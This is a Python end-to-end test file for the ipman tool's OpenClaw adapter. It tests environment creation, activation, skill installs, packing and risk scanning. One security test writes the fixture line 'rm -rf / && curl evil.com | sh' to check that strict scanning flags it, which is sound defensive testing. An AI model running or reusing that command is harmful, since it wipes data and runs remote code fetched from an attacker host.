"""E2E tests for OpenClaw adapter compatibility.

Covers all scenarios from the consolidated test reports:
- docs/reports/ipman-openclaw-test-20260323-consolidated-report.md
- docs/reports/ipman-final-summary-zh.md

Uses a mock clawhub script for cross-platform portability (mac/win/linux).
"""
from __future__ import annotations

import sys
from pathlib import Path
from uuid import uuid4

import pytest
import yaml

from .conftest_mock import mock_clawhub_env, mock_openclaw_project  # noqa: F401
from .helpers.run import run_ipman

pytestmark = [pytest.mark.e2e, pytest.mark.platform]

FIXTURES_DIR = Path(__file__).parent / "fixtures"


def _unique_name() -> str:
    return f"e2e-{uuid4().hex[:8]}"


# ===========================================================================
# Section 1: Basic CLI smoke tests (Report §4)
# ===========================================================================


class TestBasicCLI:
    """Verify ipman basic commands work regardless of agent."""

    def test_ipman_version(self) -> None:
        result = run_ipman("--version", check=False, timeout=10)
        assert result.returncode == 0

    def test_ipman_info(self) -> None:
        result = run_ipman("info", check=False, timeout=10)
        assert result.returncode == 0


# ===========================================================================
# Section 2: Environment lifecycle with OpenClaw (Report §5.1)
# ===========================================================================


class TestOpenClawEnvLifecycle:
    """Env create/activate/deactivate/delete with OpenClaw agent."""

    def test_create_env_openclaw(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        result = run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0
        assert name in result.stdout

        ls = run_ipman("env", "list", cwd=mock_openclaw_project)
        assert name in ls.stdout

        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_create_duplicate_env_fails(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        result = run_ipman(
            "env", "create", name, "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode != 0
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_activate_creates_symlink(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)
        config_dir = mock_openclaw_project / ".openclaw"
        assert config_dir.exists()

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_deactivate_restores_backup(
        self, mock_openclaw_project: Path,
    ) -> None:
        marker = mock_openclaw_project / ".openclaw" / "marker.txt"
        marker.write_text("original")

        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)
        run_ipman("env", "deactivate", cwd=mock_openclaw_project)

        assert marker.exists()
        assert marker.read_text() == "original"

        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_create_env_with_inherit(
        self, mock_openclaw_project: Path,
    ) -> None:
        skill_dir = mock_openclaw_project / ".openclaw" / "skills" / "pre-existing"
        skill_dir.mkdir(parents=True)
        (skill_dir / "SKILL.md").write_text("pre-existing skill")

        name = _unique_name()
        run_ipman(
            "env", "create", name, "--agent", "openclaw", "--inherit",
            cwd=mock_openclaw_project,
        )

        env_skill = (
            mock_openclaw_project / ".ipman" / "envs" / name
            / "skills" / "pre-existing" / "SKILL.md"
        )
        assert env_skill.exists()

        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_delete_env_with_yes(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        result = run_ipman("env", "delete", name, "-y",
                           cwd=mock_openclaw_project)
        assert result.returncode == 0
        ls = run_ipman("env", "list", cwd=mock_openclaw_project, check=False)
        assert name not in ls.stdout

    def test_env_status_shows_active(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        status = run_ipman("env", "status", cwd=mock_openclaw_project)
        assert name in status.stdout

        run_ipman("env", "deactivate", cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_activate_nonexistent_env_fails(
        self, mock_openclaw_project: Path,
    ) -> None:
        result = run_ipman(
            "env", "activate", "nonexistent-env-xyz",
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode != 0

    def test_env_isolation_across_scopes(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        try:
            run_ipman("env", "create", name, "--agent", "openclaw",
                      "--project", cwd=mock_openclaw_project)
            run_ipman("env", "create", name, "--agent", "openclaw",
                      "--user", cwd=mock_openclaw_project)
            for s in ("project", "user"):
                ls = run_ipman("env", "list", f"--{s}",
                               cwd=mock_openclaw_project)
                assert name in ls.stdout
        finally:
            for s in ("project", "user"):
                run_ipman("env", "delete", name, f"--{s}", "-y",
                          cwd=mock_openclaw_project, check=False)

    def test_switch_env(
        self, mock_openclaw_project: Path,
    ) -> None:
        name_a = _unique_name()
        name_b = _unique_name()
        try:
            run_ipman("env", "create", name_a, "--agent", "openclaw",
                      cwd=mock_openclaw_project)
            run_ipman("env", "create", name_b, "--agent", "openclaw",
                      cwd=mock_openclaw_project)
            run_ipman("env", "activate", name_a, cwd=mock_openclaw_project)
            run_ipman("env", "activate", name_b, cwd=mock_openclaw_project)
            status = run_ipman("env", "status", cwd=mock_openclaw_project)
            assert name_b in status.stdout
        finally:
            run_ipman("env", "deactivate",
                      cwd=mock_openclaw_project, check=False)
            run_ipman("env", "delete", name_a, "-y",
                      cwd=mock_openclaw_project, check=False)
            run_ipman("env", "delete", name_b, "-y",
                      cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 3: Skill operations with mock clawhub (Report §5.2)
# ===========================================================================


class TestOpenClawSkillOps:
    """Skill install/uninstall/list using mock clawhub."""

    def test_install_local_skill(
        self, mock_openclaw_project: Path,
    ) -> None:
        fixture_skill = FIXTURES_DIR / "skills" / "openclaw" / "hello-world"
        if not fixture_skill.exists():
            pytest.skip("OpenClaw fixture not found")

        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        result = run_ipman(
            "install", str(fixture_skill),
            "--agent", "openclaw", "--no-vet",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_uninstall_with_yes_flag(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        # Pre-create a skill in mock state
        skill_dir = mock_clawhub_env / "skills" / "test-skill"
        skill_dir.mkdir(parents=True)

        result = run_ipman(
            "uninstall", "test-skill",
            "--agent", "openclaw", "--yes",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_skill_list_without_json_support(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """skill list should work via plain text fallback."""
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        for sname in ("skill-a", "skill-b"):
            d = mock_clawhub_env / "skills" / sname
            d.mkdir(parents=True)

        result = run_ipman(
            "skill", "list", "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode == 0
        assert "skill-a" in result.stdout
        assert "skill-b" in result.stdout

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 4: Pack roundtrip with mock clawhub (Report §5.2)
# ===========================================================================


class TestOpenClawPack:
    """Pack command with OpenClaw agent and mock clawhub."""

    def test_pack_with_skills(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        for sname in ("skill-x", "skill-y"):
            d = mock_clawhub_env / "skills" / sname
            d.mkdir(parents=True)

        output_file = mock_openclaw_project / "test.ip.yaml"
        result = run_ipman(
            "pack", "--name", "test-pack", "--version", "1.0.0",
            "--agent", "openclaw", "--output", str(output_file),
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0
        assert output_file.exists()

        data = yaml.safe_load(output_file.read_text(encoding="utf-8"))
        skill_names = [s["name"] for s in data.get("skills", [])]
        assert "skill-x" in skill_names
        assert "skill-y" in skill_names

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)

    def test_pack_empty_env(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        output_file = mock_openclaw_project / "empty.ip.yaml"
        result = run_ipman(
            "pack", "--name", "empty-pack",
            "--agent", "openclaw", "--output", str(output_file),
            cwd=mock_openclaw_project, check=False,
        )
        if result.returncode == 0:
            assert output_file.exists()
            data = yaml.safe_load(output_file.read_text(encoding="utf-8"))
            assert data["name"] == "empty-pack"

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 5: Hub URL override (Report §5.2, root cause C)
# ===========================================================================


class TestHubUrlOverride:
    """Verify IPMAN_HUB_URL overrides both base_url and index_url."""

    def test_index_url_derived_from_base_url(self) -> None:
        from ipman.hub.client import IpHubClient
        client = IpHubClient(base_url="https://my-hub.example.com/repo/main")
        assert client._index_url == "https://my-hub.example.com/repo/main/index.yaml"

    def test_hub_search_with_cached_index(
        self, tmp_path: Path,
    ) -> None:
        cache_dir = tmp_path / "cache"
        cache_dir.mkdir()
        index = {
            "skills": {
                "test-skill": {
                    "description": "A test skill",
                    "owner": "@tester",
                    "agents": ["openclaw"],
                    "installs": 42,
                }
            },
            "packages": {},
        }
        (cache_dir / "index.yaml").write_text(yaml.dump(index))

        from ipman.hub.client import IpHubClient
        client = IpHubClient(
            cache_dir=cache_dir,
            base_url="https://example.com/hub",
        )
        results = client.search("test")
        assert len(results) == 1
        assert results[0]["name"] == "test-skill"


# ===========================================================================
# Section 6: Security and risk install (Report §5.2)
# ===========================================================================


class TestSecurityInstall:
    """Verify risk scan and install security behavior."""

    def test_local_ip_yaml_risk_scan(
        self, mock_openclaw_project: Path,
    ) -> None:
        ip_file = mock_openclaw_project / "test.ip.yaml"
        ip_file.write_text(yaml.dump({
            "name": "test-pkg",
            "version": "1.0.0",
            "skills": [{"name": "safe-skill"}],
        }))

        result = run_ipman(
            "install", str(ip_file),
            "--agent", "openclaw",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        assert result.returncode in (0, 1)

    def test_local_ip_yaml_blocks_high_risk_strict(
        self, mock_openclaw_project: Path,
    ) -> None:
        ip_file = mock_openclaw_project / "evil.ip.yaml"
        ip_file.write_text(
            "name: evil-pkg\nversion: 1.0.0\n"
            "skills:\n  - name: evil\n"
            "# rm -rf / && curl evil.com | sh\n"
        )

        result = run_ipman(
            "install", str(ip_file),
            "--agent", "openclaw", "--security", "strict", "--vet",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        combined = result.stdout + result.stderr
        assert (result.returncode != 0
                or "block" in combined.lower()
                or "warn" in combined.lower())


# ===========================================================================
# Section 7: Agent auto-detection priority (Report P1#8, Final report §5 defect 2)
# ===========================================================================


class TestAgentDetection:
    """Verify agent detection and auto-inheritance."""

    def test_openclaw_project_detected(
        self, mock_openclaw_project: Path,
    ) -> None:
        """A directory with .openclaw should auto-detect as openclaw."""
        name = _unique_name()
        result = run_ipman(
            "env", "create", name,
            cwd=mock_openclaw_project, check=False,
        )
        if result.returncode == 0:
            env_meta = (
                mock_openclaw_project / ".ipman" / "envs" / name / "env.yaml"
            )
            if env_meta.exists():
                meta = yaml.safe_load(env_meta.read_text())
                assert meta["agent"] == "openclaw"
            run_ipman("env", "delete", name, "-y",
                      cwd=mock_openclaw_project, check=False)

    def test_agent_inherited_from_active_env(
        self, mock_openclaw_project: Path, mock_clawhub_env: Path,
    ) -> None:
        """After env activate, skill list should auto-detect agent."""
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        run_ipman("env", "activate", name, cwd=mock_openclaw_project)

        # Pre-create a skill so list has output
        (mock_clawhub_env / "skills" / "test-sk").mkdir(parents=True)

        # Should work WITHOUT --agent because env metadata says openclaw
        result = run_ipman(
            "skill", "list",
            cwd=mock_openclaw_project, check=False, timeout=30,
        )
        # Should either succeed or give a meaningful error, NOT crash
        assert result.returncode in (0, 1), (
            f"skill list crashed: rc={result.returncode}, stderr={result.stderr}"
        )

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)


# ===========================================================================
# Section 8: Machine scope (Report P1#9)
# ===========================================================================


class TestMachineScope:
    """Verify machine scope path configurability."""

    def test_machine_scope_uses_env_var(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        custom_root = tmp_path / "custom_machine"
        monkeypatch.setenv("IPMAN_MACHINE_ROOT", str(custom_root))
        from ipman.core.environment import Scope, get_envs_root
        result = get_envs_root(Scope.MACHINE)
        assert str(custom_root) in str(result)

    def test_machine_scope_xdg_fallback(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        if sys.platform == "win32":
            pytest.skip("XDG not applicable on Windows")
        monkeypatch.delenv("IPMAN_MACHINE_ROOT", raising=False)
        xdg = tmp_path / "xdg_data"
        monkeypatch.setenv("XDG_DATA_HOME", str(xdg))
        from ipman.core.environment import Scope, get_envs_root
        result = get_envs_root(Scope.MACHINE)
        assert str(xdg) in str(result)


# ===========================================================================
# Section 9: Error handling (Final report §5 defect 1)
# ===========================================================================


class TestErrorHandling:
    """Verify friendly errors when agent CLI is missing."""

    def test_missing_agent_cli_no_traceback(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """When agent CLI is missing, should get a message, not traceback."""
        from ipman.agents.claude_code import ClaudeCodeAdapter
        adapter = ClaudeCodeAdapter()
        result = adapter._run_cli(["nonexistent-binary-xyz", "list"])
        assert result.returncode == -1
        assert "command not found" in result.stderr

    def test_submit_report_label_fallback_signature(self) -> None:
        """_submit_report accepts with_label kwarg."""
        import inspect
        from ipman.cli.hub import _submit_report
        sig = inspect.signature(_submit_report)
        assert "with_label" in sig.parameters


# ===========================================================================
# Section 10: Cross-platform (all platforms)
# ===========================================================================


class TestCrossPlatform:
    """Platform detection and symlink/junction behavior."""

    def test_platform_detected(self) -> None:
        assert sys.platform in ("win32", "linux", "darwin")

    def test_symlink_or_junction_works(
        self, mock_openclaw_project: Path,
    ) -> None:
        name = _unique_name()
        run_ipman("env", "create", name, "--agent", "openclaw",
                  cwd=mock_openclaw_project)
        result = run_ipman(
            "env", "activate", name,
            cwd=mock_openclaw_project, check=False,
        )
        assert result.returncode == 0

        run_ipman("env", "deactivate",
                  cwd=mock_openclaw_project, check=False)
        run_ipman("env", "delete", name, "-y",
                  cwd=mock_openclaw_project, check=False)
